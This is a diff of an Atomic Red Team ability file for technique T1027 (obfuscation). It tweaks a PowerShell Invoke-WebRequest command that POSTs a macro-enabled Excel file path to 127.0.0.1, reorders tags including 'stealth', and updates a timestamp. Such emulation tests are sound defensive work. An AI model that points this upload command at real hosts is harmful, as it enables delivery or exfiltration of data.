@@ -13,15 +13,16 @@
     windows:
       psh:
         command: Invoke-WebRequest -Uri 127.0.0.1 -Method POST -Body "PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm"
+          -UseBasicParsing
   plugin: atomic
   singleton: false
   repeatable: true
   delete_payload: false
   privilege: ''
   buckets:
+  - stealth
   - atomic-red-team
   - t1027
-  - stealth
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -35,4 +36,4 @@
         default: 127.0.0.1
     technique_created: '2017-05-31T21:30:32.662Z'
     atomic_guid: e2d85e66-cb66-4ed7-93b1-833fc56c9319
-    import_timestamp: '2026-10-20T07:08:26.799415Z'
+    import_timestamp: '2026-10-21T07:01:49.553267Z'
